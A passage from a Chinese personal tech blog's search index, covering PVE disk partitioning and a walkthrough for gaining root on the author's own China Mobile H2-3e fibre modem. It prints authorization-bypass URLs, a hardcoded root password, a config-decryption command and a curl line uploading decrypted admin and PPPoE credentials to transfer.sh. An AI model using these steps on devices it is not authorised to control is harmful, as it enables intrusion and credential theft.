\u200b\u611f\u5174\u8da3\u200b\u7684\u200b\u7f51\u53cb\u200b\u3002</p>"},{"location":"1/2/#_3","title":"\u53c2\u8003","text":"<p>\u200b\u66f4\u200b\u591a\u200b\u76f8\u5173\u200b\u7684\u200b\u5bf9\u6bd4\u200b\uff0c\u200b\u5927\u5bb6\u200b\u53ef\u4ee5\u200b\u81ea\u884c\u200b\u9605\u8bfb\u200b\u4e00\u4e0b\u200b\u4e0b\u53d1\u200b\u7684\u200b\u53c2\u8003\u200b\u94fe\u63a5\u200b\uff1a</p> <ul> <li>\u200b\u77e5\u4e4e\u200b - ESXi\u3001PVE\u3001unRaid\u200b\u5bf9\u6bd4\u200b</li> <li>V2EX - \u200b\u804a\u804a\u200b esxi \u200b\u548c\u200b pve \u200b\u5bb6\u7528\u200b\u573a\u666f\u200b\u54ea\u4e2a\u200b\u66f4\u200b\u6709\u200b\u4f18\u52bf\u200b</li> </ul>"},{"location":"1/3/","title":"\u78c1\u76d8\u200b\u5212\u5206","text":"<p>\u200b\u7ec6\u5fc3\u200b\u7684\u200b\u7f51\u53cb\u200b\u53d1\u73b0\u200b\u56fd\u5149\u200b\u8fd9\u5957\u200b\u914d\u7f6e\u200b\u4f7f\u7528\u200b\u4e86\u200b\u5f88\u591a\u200b\u786c\u76d8\u200b\uff1a</p> \u200b\u786c\u76d8\u200b \u200b\u578b\u53f7\u200b \u200b\u786c\u76d8\u200b - 1 \u200b\u91d1\u5e2e\u200b P4LL PCIe 4.0 NVEM \u200b\u534f\u8bae\u200b SSD 1TB \u200b\u786c\u76d8\u200b - 2 \u200b\u897f\u200b\u6570\u200b SN550 NVEM \u200b\u534f\u8bae\u200b SSD  256GB  (\u200b\u505a\u200b PVE \u200b\u542f\u52a8\u76d8\u200b) \u200b\u786c\u76d8\u200b - 3 \u200b\u897f\u200b\u6570\u200b SN570 NVEM \u200b\u534f\u8bae\u200b SSD 1TB \uff08\u200b\u7ec4\u786c\u200b Raid0\uff09 \u200b\u786c\u76d8\u200b - 4 \u200b\u897f\u200b\u6570\u200b SN570 NVEM \u200b\u534f\u8bae\u200b SSD 1TB\uff08\u200b\u7ec4\u786c\u200b Raid0\uff09 \u200b\u786c\u76d8\u200b - 5 \u200b\u68b5\u60f3\u200b S500 Pro NVEM \u200b\u534f\u8bae\u200b SSD 1TB \u200b\u786c\u76d8\u200b - 6 \u200b\u7231\u56fd\u8005\u200b P3000 Pro NVEM \u200b\u534f\u8bae\u200b SSD 1TB \u200b\u786c\u76d8\u200b - 7 \u200b\u9541\u5149\u200b M600 SSD \u200b\u7edd\u7248\u200b MLC \u200b\u9897\u7c92\u200b SATA  \u200b\u534f\u8bae\u200b  SSD 1TB \u200b\u786c\u76d8\u200b - 8 \u200b\u6a0a\u60f3\u200b FP325 \u200b\u7cfb\u5217\u200b SSD SATA \u200b\u534f\u8bae\u200b SSD 256GB \u200b\u786c\u76d8\u200b - 9 \u200b\u5e0c\u6377\u200b\u9177\u9e70\u200b ST4000VX007  \u200b\u5782\u76f4\u200b\u975e\u53e0\u74e6\u200b HDD 4TB <p>\u200b\u56fd\u5149\u200b\u7528\u200b\u8fd9\u5957\u200b PVE \u200b\u4e3b\u8981\u200b\u5c31\u662f\u200b\u60f3\u591a\u5f00\u200b\u865a\u62df\u673a\u200b\u4f7f\u7528\u200b\uff0c\u200b\u5982\u679c\u200b\u51e0\u5341\u4e2a\u200b\u865a\u62df\u673a\u200b\u540c\u65f6\u200b\u8fd0\u884c\u200b\u7684\u8bdd\u200b\uff0c\u200b\u5bf9\u200b\u786c\u76d8\u200b\u7684\u200b\u8d1f\u62c5\u200b\u4e5f\u200b\u662f\u200b\u4e0d\u5c0f\u200b\u7684\u200b\uff0c\u200b\u6240\u4ee5\u200b\u56fd\u5149\u200b\u6211\u200b\u76f4\u63a5\u200b\u4e0a\u200b\u4e86\u200b 6 \u200b\u4e2a\u200b NVME \u200b\u786c\u76d8\u200b\u6765\u200b\u7528\u6765\u200b\u5206\u62c5\u200b\u786c\u76d8\u200b\u538b\u529b\u200b\u3002</p> <p>\u200b\u5177\u4f53\u200b\u7528\u6cd5\u200b\uff0c\u200b\u4e0b\u9762\u200b\u753b\u4e2a\u200b\u8349\u56fe\u200b\u6765\u8bb2\u200b\u4e00\u4e0b\u200b\u56fd\u5149\u200b\u6211\u200b\u6253\u7b97\u200b\u600e\u4e48\u200b\u4f7f\u7528\u200b\u8fd9\u4e9b\u200b\u786c\u76d8\u200b\uff1a</p> <p> </p> <ol> <li>SN 570 \u200b\u4f5c\u4e3a\u200b PVE \u200b\u7684\u200b\u5b89\u88c5\u200b\u7cfb\u7edf\u76d8\u200b\uff0c\u200b\u4fdd\u8bc1\u200b PVE \u200b\u7684\u200b\u8fd0\u884c\u200b\u6d41\u7a0b\u200b\u7684\u200b\u540c\u65f6\u200b\u4e5f\u200b\u7528\u6765\u200b\u5b58\u653e\u200b\u8fd0\u884c\u200b\u865a\u62df\u673a\u200b</li> <li>SN 550\u3001S500\u3001P3000 Pro \u200b\u5747\u200b\u6302\u8f7d\u200b\u4e3a\u200b PVE \u200b\u7684\u200b\u76ee\u5f55\u200b\uff0c\u200b\u7528\u6765\u200b\u5b58\u653e\u200b\u8fd0\u884c\u200b\u865a\u62df\u673a\u200b</li> <li>FP325 \u200b\u8fd9\u4e2a\u200b 256GB \u200b\u56fa\u6001\u200b\u4e5f\u200b\u6302\u8f7d\u200b\u4e3a\u200b PVE \u200b\u7684\u200b\u76ee\u5f55\u200b\uff0c\u200b\u4f46\u662f\u200b\u53ea\u200b\u7528\u6765\u200b\u4f5c\u4e3a\u200b PVE \u200b\u7684\u200b iSO \u200b\u955c\u50cf\u200b\u4ed3\u5e93\u200b\u548c\u200b\u6a21\u677f\u200b\u4ed3\u5e93\u200b\u4f7f\u7528\u200b</li> <li>4TB \u200b\u7684\u200b HDD \u200b\u673a\u68b0\u200b\u786c\u76d8\u200b\u5206\u4e3a\u200b NTFS\u3001APFS\u200b\u548c\u200b exFAT \u200b\u683c\u5f0f\u200b\uff0c\u200b\u7528\u4e8e\u200b\u76f4\u901a\u200b macOS \u200b\u6216\u8005\u200b Windows \u200b\u865a\u62df\u673a\u200b\u4f7f\u7528\u200b</li> <li>1TB NTFS \u200b\u53ef\u4ee5\u200b\u4f5c\u4e3a\u200b Windows \u200b\u865a\u62df\u673a\u200b\u7684\u200b\u5b58\u50a8\u200b\u76d8\u200b</li> <li>2TB APFS \u200b\u53ef\u4ee5\u200b\u4f5c\u4e3a\u200b macOS \u200b\u865a\u62df\u673a\u200b\u7684\u200b\u5b58\u50a8\u200b\u76d8\u200b</li> <li>\u200b\u5269\u4e0b\u200b\u7684\u200b\u5206\u533a\u200b exFAT \u200b\u683c\u5f0f\u200b\u7684\u200b\u5206\u533a\u200b\u7528\u6237\u200b Windows \u200b\u548c\u200b macOS \u200b\u7684\u200b\u4ea4\u4e92\u200b\u516c\u7528\u200b\u5b58\u50a8\u200b\u533a\u57df\u200b</li> <li>M600 SATA SSD \u200b\u4e13\u95e8\u200b\u7528\u4e8e\u200b Windows \u200b\u4e0b\u200b\u76f4\u901a\u200b\u7684\u200b\u6e38\u620f\u200b\u76d8\u200b\uff0c\u200b\u4fdd\u969c\u200b\u6e38\u620f\u200b\u7684\u200b\u52a0\u8f7d\u200b\u901f\u5ea6\u200b</li> </ol> <p>\u200b\u4e0b\u9762\u200b\u662f\u200b\u786c\u76d8\u200b\u5212\u5206\u200b\u7684\u200b\u7ec6\u8282\u200b\u56fe\u200b\uff1a</p> <p> </p>"},{"location":"10/5/","title":"5","text":""},{"location":"10/5/#_1","title":"\u5410\u69fd\u200b\u4e00\u4e0b","text":"<p>\u200b\u968f\u7740\u200b\u7f51\u7edc\u200b\u7684\u200b\u53d1\u5c55\u200b\uff0c\u200b\u56fd\u5185\u200b\u8fd0\u8425\u5546\u200b\u7684\u200b\u5149\u732b\u200b\u9650\u5236\u200b\u8d8a\u6765\u8d8a\u200b\u4e25\u683c\u200b\u3002\u200b\u867d\u7136\u200b\u51fa\u53d1\u70b9\u200b\u53ef\u80fd\u200b\u662f\u200b\u4e3a\u4e86\u200b\u4fdd\u62a4\u200b\u7528\u6237\u200b\u5bb6\u5ead\u8bbe\u5907\u200b\u7684\u200b\u7f51\u7edc\u5b89\u5168\u200b\uff0c\u200b\u4f46\u662f\u200b\u5bf9\u4e8e\u200b\u6211\u4eec\u200b\u8fd9\u4e9b\u200b\u6709\u200b\u6298\u817e\u200b\u9700\u6c42\u200b\u7684\u200b\u7528\u6237\u200b\u6765\u8bf4\u200b\u95e8\u69db\u200b\u5c31\u200b\u9ad8\u200b\u4e86\u200b\u5f88\u591a\u200b\u3002\u200b\u4e0b\u9762\u200b\u56fd\u5149\u200b\u5c31\u200b\u62ff\u200b\u6c5f\u82cf\u200b\u5357\u4eac\u200b\u79fb\u52a8\u200b\u7684\u200b\u5149\u732b\u200b\u4e3a\u4f8b\u200b\uff0c\u200b\u8bb0\u5f55\u200b\u4e00\u4e0b\u200b\u56fd\u5149\u200b\u6211\u200b\u7684\u200b\u6298\u817e\u200b\u8fc7\u7a0b\u200b\u3002</p>"},{"location":"10/5/#_2","title":"\u5149\u732b\u200b\u73b0\u72b6","text":""},{"location":"10/5/#_3","title":"\u5916\u89c2\u200b\u6982\u89c8","text":"<p>\u200b\u8bbe\u5907\u200b\u540d\u79f0\u200b\uff1a\u200b\u5409\u200b\u6bd4\u7279\u200b\u65e0\u6e90\u200b\u5149\u7ea4\u200b\u63a5\u5165\u200b\u7528\u6237\u7aef\u200b\u8bbe\u5907\u200b(GPON ONU) \u200b\u8bbe\u5907\u200b\u7c7b\u578b\u200b\uff1a\u200b\u4e2d\u56fd\u79fb\u52a8\u200b\u667a\u80fd\u7f51\u200b\u5173\u200b \u200b\u8bbe\u5907\u200b\u578b\u53f7\u200b\uff1aH2-3e\uff08\u200b\u65e0\u200b\u8bed\u97f3\u200b/\u200b\u65e0\u200b Wi-Fi\uff09 \u200b\u751f\u4ea7\u65e5\u671f\u200b\uff1a2022-08-18</p> <p>\u200b\u5bb6\u200b\u7528\u5149\u200b\u732b\u200b\u7684\u200b\u6027\u80fd\u200b\u90fd\u200b\u6bd4\u8f83\u200b\u5783\u573e\u200b\uff0c\u200b\u56fd\u5149\u200b\u6211\u200b\u76ee\u524d\u200b\u4f7f\u7528\u200b\u7684\u200b\u5149\u732b\u200b\u914d\u7f6e\u200b\u8fd8\u200b\u7b97\u662f\u200b\u4e0d\u9519\u200b\u7684\u200b\u4e86\u200b\uff08\u200b\u77ee\u5b50\u200b\u91cc\u200b\u62d4\u9ad8\u200b\u4e2a\u200b\uff09\uff0c\u200b\u6700\u8d77\u7801\u200b\u6709\u200b 4 \u200b\u4e2a\u200b\u5343\u5146\u200b LAN \u200b\u53e3\u200b\uff0c\u200b\u4e0b\u9762\u200b\u662f\u200b\u51e0\u5f20\u200b\u5916\u89c2\u200b\u56fe\u7247\u200b\uff1a</p> \u200b\u80cc\u9762\u200b\u4fe1\u606f\u200b\u6b63\u9762\u200b\u4fe1\u606f\u200b\u63a5\u53e3\u200b\u4fe1\u606f\u200b <p> </p> <p>\u200b\u53ef\u4ee5\u200b\u770b\u51fa\u200b\u662f\u200b 2022 \u200b\u5e74\u200b 8 \u200b\u6708\u4efd\u200b\u751f\u4ea7\u200b\u7684\u200b\u5149\u732b\u200b\uff0c\u200b\u6240\u4ee5\u200b\u7406\u8bba\u200b\u4e0a\u200b\u6765\u8bf4\u200b\u56fa\u4ef6\u200b\u662f\u200b\u6bd4\u8f83\u200b\u65b0\u200b\u7684\u200b\uff0c\u200b\u95e8\u69db\u200b\u4e5f\u200b\u6bd4\u200b\u7f51\u4e0a\u200b\u90a3\u4e9b\u200b\u8001\u200b\u7684\u200b\u5149\u732b\u200b\u95e8\u69db\u200b\u9ad8\u200b\u4e00\u70b9\u200b\u3002 </p> <p> </p> <p>\u200b\u6b63\u9762\u200b\u6ca1\u200b\u5565\u200b\u597d\u770b\u200b\u7684\u200b\uff0c\u200b\u6beb\u65e0\u200b\u4eae\u70b9\u200b\u3002</p> <p></p> <p>\u200b\u5c31\u200b\u8fd9\u200b 4 \u200b\u4e2a\u200b\u5168\u200b\u5343\u5146\u200b LAN \u200b\u53e3\u200b\u611f\u89c9\u200b\u8fd8\u200b\u6709\u70b9\u200b\u7528\u5904\u200b\uff0c\u200b\u540e\u9762\u200b\u6539\u200b\u6865\u63a5\u200b\u53ef\u4ee5\u200b\u591a\u63a5\u200b\u4e00\u4e9b\u200b\u8bbe\u5907\u200b\u3002</p>"},{"location":"10/5/#_4","title":"\u7cfb\u7edf\u200b\u6982\u51b5","text":"<p>\u200b\u666e\u901a\u7528\u6237\u200b\u53ea\u80fd\u200b\u4f7f\u7528\u200b\u5149\u732b\u200b\u80cc\u9762\u200b\u7684\u200b user \u200b\u666e\u901a\u7528\u6237\u200b\u767b\u5f55\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u65b0\u4e00\u4ee3\u200b\u5149\u732b\u200b\u90fd\u200b\u662f\u200b\u901a\u8fc7\u200b\u8fdc\u7a0b\u200b\u4e0b\u53d1\u200b\u5b9a\u671f\u200b\u66f4\u6539\u200b\u5bc6\u7801\u200b\u7684\u200b\uff0c\u200b\u6240\u4ee5\u200b\u5e76\u200b\u6ca1\u6709\u200b\u9ed8\u8ba4\u200b\u7684\u200b\u8d85\u7ba1\u200b\u5bc6\u7801\u200b\uff0c\u200b\u8fd9\u5757\u200b\u5148\u653e\u200b\u4e00\u653e\u200b\uff0c\u200b\u6211\u4eec\u200b\u5148\u200b\u4f7f\u7528\u200b\u666e\u901a\u7528\u6237\u200b\u767b\u5f55\u200b\u770b\u770b\u200b\u518d\u8bf4\u200b\uff1a</p> <p> </p> <p>\u200b\u4e0b\u9762\u200b\u662f\u200b\u51e0\u5f20\u200b\u7cfb\u7edf\u200b\u5185\u90e8\u200b\u7684\u200b\u56fe\u7247\u200b\u4fe1\u606f\u200b\uff1a</p> \u200b\u5bbd\u5e26\u7f51\u200b\u5173\u200b\u8bbe\u5907\u200bDHCP\u200b\u5b89\u5168\u200b\u5bb6\u957f\u200b\u5b58\u50a8\u200b\u7f51\u901f\u200b\u4e0a\u7f51\u200b\u66f4\u65b0\u200b\u7528\u6237\u200b <p> </p> <p>\u200b\u5c55\u793a\u200b\u4e86\u200b\u4e00\u4e9b\u200b\u6e29\u5ea6\u200b\u548c\u200b\u8054\u7f51\u200b\u670d\u52a1\u200b\u60c5\u51b5\u200b\u7b49\u200b\u57fa\u672c\u200b\u4fe1\u606f\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u56fd\u5149\u200b\u6211\u200b\u8fd9\u91cc\u200b\u8054\u7f51\u200b\u670d\u52a1\u200b\u60c5\u51b5\u200b\u5c11\u200b\u4e86\u200b 1 \u200b\u4e2a\u200b\u300c\u200b\u4e2d\u56fd\u79fb\u52a8\u200b\u5bbd\u5e26\u200b\u7ba1\u7406\u4e2d\u5fc3\u200b\u300d\uff0c\u200b\u8fd9\u200b\u662f\u56e0\u4e3a\u200b\u56fd\u5149\u200b\u6211\u200b\u540e\u9762\u200b\u624b\u52a8\u200b\u5220\u6389\u200b\u8fd9\u4e2a\u200b\u670d\u52a1\u200b\u4e86\u200b\uff0c\u200b\u5220\u200b\u4e86\u200b\u8fd9\u4e2a\u200b\u670d\u52a1\u200b\u6211\u4eec\u200b\u7684\u200b\u5149\u732b\u200b\u5c31\u200b\u4e0d\u4f1a\u200b\u88ab\u200b\u8fdc\u7a0b\u200b\u4e0b\u53d1\u200b\u4efb\u52a1\u200b\u4e86\u200b\uff0c\u200b\u8d85\u7ba1\u200b\u5bc6\u7801\u200b\u4e5f\u200b\u4e0d\u4f1a\u200b\u88ab\u200b\u5b9a\u671f\u200b\u66f4\u6539\u200b\u3002\u200b\u4e0b\u9762\u200b\u770b\u770b\u200b\u6ca1\u6709\u200b\u5220\u200b\u4e4b\u524d\u200b\u662f\u200b\u5565\u6837\u5b50\u200b\u7684\u200b\uff1a</p> <p> </p> <p></p> <p>\u200b\u5c55\u793a\u200b\u4e86\u200b CPU\u3001\u200b\u5185\u5b58\u200b\u7684\u200b\u4f7f\u7528\u7387\u200b\uff0c\u200b\u4ee5\u53ca\u200b\u63a5\u53e3\u200b\u7684\u200b\u8fde\u63a5\u200b\u4fe1\u606f\u200b\u7b49\u200b\u3002\u200b\u786c\u4ef6\u200b\u578b\u53f7\u200b\u4e3a\u200b\u5409\u200b\u6bd4\u7279\u200b H2-3e\uff0c\u200b\u6240\u200b\u4f7f\u7528\u200b\u7684\u200b\u56fa\u4ef6\u200b\u7248\u672c\u200b HWVer-A911</p> <p></p> <p></p> <p></p> <p> </p> <p></p> <p></p> <p></p> <p></p> <p></p>"},{"location":"10/5/#_5","title":"\u7b80\u5355\u200b\u603b\u7ed3","text":"<p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u666e\u901a\u7528\u6237\u200b\u8fdb\u53bb\u200b\u57fa\u672c\u4e0a\u200b\u5565\u200b\u4e5f\u200b\u5e72\u4e0d\u4e86\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u524d\u7aef\u200b\u9875\u9762\u200b\u7ed9\u200b\u4eba\u200b\u4e00\u79cd\u200b\u534a\u6210\u54c1\u200b\u7684\u200b\u611f\u89c9\u200b\uff0c\u200b\u6211\u4eec\u200b\u5f88\u591a\u200b\u8fdb\u9636\u200b\u64cd\u4f5c\u200b\u5728\u200b\u8fd9\u4e2a\u200b\u754c\u9762\u200b\u80af\u5b9a\u200b\u662f\u200b\u6ca1\u6cd5\u200b\u64cd\u4f5c\u200b\u7684\u200b\uff0c\u200b\u6240\u4ee5\u200b\u9700\u8981\u200b\u4f7f\u7528\u200b\u8d85\u7ba1\u200b\uff08CMCCAdmin\uff09\u200b\u7684\u200b\u8eab\u4efd\u200b\u8fdb\u200b\u540e\u53f0\u200b\u624d\u200b\u53ef\u4ee5\u200b\u3002</p>"},{"location":"10/5/#_6","title":"\u8d85\u7ba1\u200b\u6743\u9650","text":""},{"location":"10/5/#_7","title":"\u8d8a\u6743\u200b\u8bbf\u95ee","text":"<p>\u200b\u4e2d\u56fd\u79fb\u52a8\u200b\u8fd9\u4e2a\u200b\u5409\u200b\u6bd4\u7279\u200b H2-3e \u200b\u5149\u732b\u200b\u7684\u200b Web \u200b\u7cfb\u7edf\u200b\u5199\u200b\u7684\u200b\u5f88\u200b\u5783\u573e\u200b\uff0c\u200b\u5728\u200b user \u200b\u7528\u6237\u200b\u767b\u5f55\u200b\u7684\u200b\u72b6\u6001\u200b\u4e0b\u200b\uff0c\u200b\u7136\u540e\u200b\u8bbf\u95ee\u200b\u4e0b\u9762\u200b\u7684\u200b\u754c\u9762\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u8d8a\u6743\u200b\u8bbf\u95ee\u200b\u5230\u200b CMCCAdmin \u200b\u7684\u200b\u7ba1\u7406\u200b\u9875\u9762\u200b\uff1a</p> <p>http://192.168.1.1/start.ghtml</p> <p> </p> <p>\u200b\u4f46\u662f\u200b\u5427\u200b\u867d\u7136\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u8fd9\u4e2a\u200b\u754c\u9762\u200b\u4e86\u200b\uff0c\u200b\u8fd8\u662f\u200b\u6709\u200b\u4e00\u4e9b\u200b\u529f\u80fd\u200b\u6211\u4eec\u200b\u662f\u200b\u65e0\u6cd5\u200b\u64cd\u4f5c\u200b\u7684\u200b\uff08\u200b\u6865\u63a5\u200b\u529f\u80fd\u200b\u3001\u200b\u9632\u706b\u5899\u200b\u5173\u95ed\u200b\u7b49\u200b\uff09\uff0c\u200b\u6240\u4ee5\u200b\u6211\u4eec\u200b\u9700\u8981\u200b\u5149\u660e\u6b63\u5927\u200b\u7684\u200b\u62ff\u5230\u200b\u771f\u6b63\u200b\u7684\u200b CMCCAdmin \u200b\u7528\u6237\u200b\u7684\u200b\u5bc6\u7801\u200b\u6765\u200b\u767b\u5f55\u200b\u64cd\u4f5c\u200b\u8fd9\u4e2a\u200b\u754c\u9762\u200b\u624d\u884c\u200b\u3002</p>"},{"location":"10/5/#telnet","title":"\u5f00\u542f\u200b Telnet","text":"<p>\u200b\u9ed8\u8ba4\u200b\u60c5\u51b5\u200b\u4e0b\u5149\u200b\u732b\u200b\u662f\u200b\u6ca1\u6709\u200b\u5f00\u542f\u200b Telnet 23 \u200b\u7aef\u53e3\u200b\u7684\u200b\uff0c\u200b\u8fd9\u6837\u200b\u6211\u4eec\u200b\u5c31\u200b\u6ca1\u6cd5\u200b\u548c\u200b\u5149\u732b\u200b shell \u200b\u4ea4\u4e92\u200b\u4e86\u200b\uff1a</p> <p> </p> <p>\u200b\u8fd8\u662f\u200b\u9274\u6743\u200b\u4e0d\u5f53\u200b\u7684\u200b\u6f0f\u6d1e\u200b\uff0c\u200b\u5728\u200b user \u200b\u7528\u6237\u200b\u767b\u5f55\u200b\u7684\u200b\u72b6\u6001\u200b\u4e0b\u200b\uff0c\u200b\u6211\u4eec\u200b\u53ef\u4ee5\u200b\u8bbf\u95ee\u200b\u4e0b\u9762\u200b\u7684\u200b URL \u200b\u76f4\u63a5\u200b\u8df3\u8f6c\u200b\u5230\u200b Telnet \u200b\u7684\u200b\u914d\u7f6e\u200b\u9875\u9762\u200b\uff1a</p> <p>http://192.168.1.1/getpage.gch?pid=1002&amp;nextpage=tele_sec_tserver_t.gch</p> <p>\u200b\u7136\u540e\u200b\u5f00\u542f\u200b Telnet\uff0c\u200b\u8bbe\u7f6e\u200b\u597d\u200b Telnet \u200b\u7684\u200b\u7528\u6237\u540d\u200b  CMCCAdmin \u200b\u7684\u200b\u5bc6\u7801\u200b\uff0c\u200b\u7136\u540e\u200b\u52fe\u9009\u200b WAN \u200b\u548c\u200b LAN \u200b\u4fa7\u200b\u8bbf\u95ee\u200b\uff08\u200b\u4fdd\u5b58\u200b \u200b\u591a\u200b\u64cd\u4f5c\u200b\u51e0\u6b21\u200b\u5c31\u884c\u200b\uff09\uff1a</p> <p> </p> <p>\u200b\u6b64\u65f6\u200b\u5728\u200b\u770b\u770b\u200b\u5149\u732b\u200b\u7684\u200b\u7aef\u53e3\u200b\u5f00\u653e\u200b\u60c5\u51b5\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u53d1\u73b0\u200b 23 \u200b\u7aef\u53e3\u200b\u6b63\u5e38\u200b\u5f00\u653e\u200b\u4e86\u200b\uff1a</p> <p> </p>"},{"location":"10/5/#root","title":"\u83b7\u53d6\u200b root \u200b\u6743\u9650","text":"<p>\u200b\u56e0\u4e3a\u200b\u5386\u53f2\u200b\u9057\u7559\u200b\u7684\u200b\u95ee\u9898\u200b\uff0c\u200b\u4e5f\u200b\u662f\u200b\u4e2d\u56fd\u79fb\u52a8\u200b\u7684\u200b\u4ee3\u7801\u200b\u5199\u200b\u7684\u200b\u592a\u70c2\u200b\u4e86\u200b\uff0c\u200b\u5f88\u591a\u200b\u9ad8\u200b\u6743\u9650\u200b\u7684\u200b\u5bc6\u7801\u200b\u751a\u81f3\u200b\u76f4\u63a5\u200b\u786c\u200b\u7f16\u7801\u200b\u5230\u200b\u4ee3\u7801\u200b\u91cc\u9762\u200b\uff1a</p> <p> </p> <p>\u200b\u6240\u4ee5\u200b\u5e78\u8fd0\u200b\u7684\u200b\u662f\u200b\uff0cTelnet \u200b\u4e0b\u200b su \u200b\u5207\u6362\u200b root \u200b\u7528\u6237\u200b\uff0c\u200b\u5bc6\u7801\u200b\u4f9d\u7136\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b\uff1a  aDm8H%MdA \u200b\u767b\u5f55\u200b</p> <p> </p>"},{"location":"10/5/#_8","title":"\u83b7\u53d6\u200b\u8d85\u7ba1\u200b\u5bc6\u7801","text":"<p>\u200b\u56e0\u4e3a\u200b\u4e2d\u56fd\u79fb\u52a8\u200b\u4f1a\u200b\u901a\u8fc7\u200b\u4ed6\u200b\u7684\u200b\u4e2d\u56fd\u79fb\u52a8\u200b\u5bbd\u5e26\u200b\u7ba1\u7406\u4e2d\u5fc3\u200b\u8fdc\u7a0b\u200b\u4e0b\u53d1\u200b\u4efb\u52a1\u200b\u4e86\u200b\uff0c\u200b\u5b9a\u671f\u200b\u66f4\u6362\u200b\u8d85\u7ba1\u200b\u5bc6\u7801\u200b\uff0c\u200b\u4e0d\u8fc7\u200b\u597d\u200b\u5728\u200b\u6211\u4eec\u200b\u5728\u200b root \u200b\u7684\u200b shell \u200b\u4ea4\u4e92\u6027\u200b\u4e0b\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u89e3\u5bc6\u200b\u51fa\u8d85\u200b\u7ba1\u200b\u7684\u200b\u5bc6\u7801\u200b\uff1a</p> Bash<pre><code># \u200b\u89e3\u5bc6\u200b db_user_cfg.xml \u200b\u914d\u7f6e\u6587\u4ef6\u200b\nsidbg 1 DB decry /userconfig/cfg/db_user_cfg.xml\n\n# \u200b\u5c06\u200b\u89e3\u5bc6\u200b\u540e\u200b\u7684\u200b\u6587\u4ef6\u4f20\u8f93\u200b\u5230\u200b transfer.sh\ncurl -v -k --upload-file /tmp/debug-decry-cfg  https://transfer.sh/debug.xml\n</code></pre> <p>transfer.sh \u200b\u662f\u200b\u7b2c\u4e09\u65b9\u200b\u8fd0\u8d39\u200b\u5546\u200b\u53ef\u80fd\u200b\u6709\u200b\u4e00\u5b9a\u200b\u6cc4\u9732\u200b\u5206\u4eab\u200b\uff0c\u200b\u5982\u679c\u200b\u62c5\u5fc3\u200b\u6570\u636e\u200b\u6cc4\u9732\u200b\u7684\u200b\u5c0f\u4f19\u4f34\u200b\u81ea\u5df1\u200b\u672c\u5730\u200b\u67e5\u770b\u200b\u5373\u53ef\u200b\u3002\u200b\u56fd\u5149\u200b\u6211\u200b\u4e2a\u4eba\u200b\u5efa\u8bae\u200b\u5907\u4efd\u200b\u4e00\u4e0b\u200b\u8fd9\u4e2a\u200b\u6587\u4ef6\u200b\uff0c\u200b\u6bd5\u7adf\u200b\u6211\u4eec\u200b\u540e\u9762\u200b\u6539\u200b\u6865\u63a5\u200b\uff0c\u200b\u5220\u200b\u4e86\u200b\u4e00\u4e9b\u200b\u914d\u7f6e\u200b\u5c31\u200b\u56de\u4e0d\u6765\u200b\u4e86\u200b\u3002</p> <p>curl \u200b\u4e0a\u4f20\u200b\u6210\u529f\u200b\u6216\u200b\u56de\u200b\u8fd4\u56de\u200b\u968f\u673a\u200b\u8def\u5f84\u200b\u7684\u200b URL\uff1a</p> <p> </p> <p>\u200b\u8bbf\u95ee\u200b\u5373\u53ef\u200b\u4e0b\u8f7d\u200b\u6211\u4eec\u200b\u7684\u200b\u914d\u7f6e\u6587\u4ef6\u200b\uff1a</p> <p> </p> <p>\u200b\u4e0b\u9762\u200b\u6765\u200b\u770b\u770b\u200b\u8fd9\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u91cc\u9762\u200b\u8bb0\u5f55\u200b\u4e86\u200b\u54ea\u4e9b\u200b\u4fe1\u606f\u200b\u3002</p> <ul> <li>\u200b\u5149\u732b\u200b\u7684\u200b\u8d85\u7ba1\u200b\u548c\u200b\u666e\u901a\u7528\u6237\u200b\u7684\u200b\u5bc6\u7801\u200b\u4fe1\u606f\u200b\uff1a</li> </ul> <p> </p> <ul> <li>\u200b\u4fdd\u5b58\u200b\u7684\u200b PPPoE \u200b\u62e8\u53f7\u4e0a\u7f51\u200b\u7684\u200b\u4fe1\u606f\u200b</li> </ul> <p> </p> <p>\u200b\u6b64\u65f6\u200b\u56de\u5230\u200b\u4e4b\u524d\u200b\u7684\u200b http://192.168.1.1/ \u200b\u9875\u9762\u200b\uff0c\u200b\u6211\u4eec\u200b\u91cd\u65b0\u200b\u4f7f\u7528\u200b\u83b7\u53d6\u200b\u5230\u200b\u7684\u200b CMCCAdmin \u200b\u7684\u200b\u7528\u6237\u540d\u200b\u548c\u200b\u5bc6\u7801\u200b\u767b\u5f55\u200b\u5373\u53ef\u200b\u3002</p>"},{"location":"10/5/#_9","title":"\u5149\u732b\u200b\u8c03\u6559","text":""},{"location":"10/5/#tr069","title":"\u5220\u9664\u200b TR069","text":"<p>\u200b\u56e0\u4e3a\u200b\u79fb\u52a8\u200b\u7684\u200b\u5149\u732b\u200b\u662f\u200b\u901a\u8fc7\u200b TR069 \u200b\u4e2d\u56fd\u79fb\u52a8\u200b\u5bbd\u5e26\u200b\u7ba1\u7406\u4e2d\u5fc3\u200b\u8fdc\u7a0b\u200b\u4e0b\u53d1\u200b\u4efb\u52a1\u200b\u4e86\u200b\uff0c\u200b\u505a\u200b\u4e00\u4e9b\u200b\u5b9a\u671f\u200b\u66f4\u6362\u200b\u8d85\u7ba1\u200b\u5bc6\u7801\u200b\u7b49\u200b\u64cd\u4f5c\u200b\u7684\u200b\uff0c\u200b\u6240\u4ee5\u200b\u6211\u4eec\u200b\u9700\u8981\u200b\u5220\u6389\u200b\u5b83\u200b\uff0c\u200b\u4e00\u52b3\u6c38\u9038\u200b\uff0c\u200b\u8fd9\u6837\u200b\u8d85\u7ba1\u200b\u5bc6\u7801\u200b\u5c31\u200b\u4e00\u76f4\u200b\u662f\u200b\u6211\u4eec\u200b\u89e3\u5bc6\u200b\u51fa\u6765\u200b\u7684\u200b\u6837\u5b50\u200b\u4e86\u200b\uff1a</p> <p> </p> <p>\u200b\u4e0d\u8fc7\u200b\u5982\u679c\u200b\u4e0d\u200b\u5220\u6389\u200b\u8fd9\u4e2a\u200b TR069 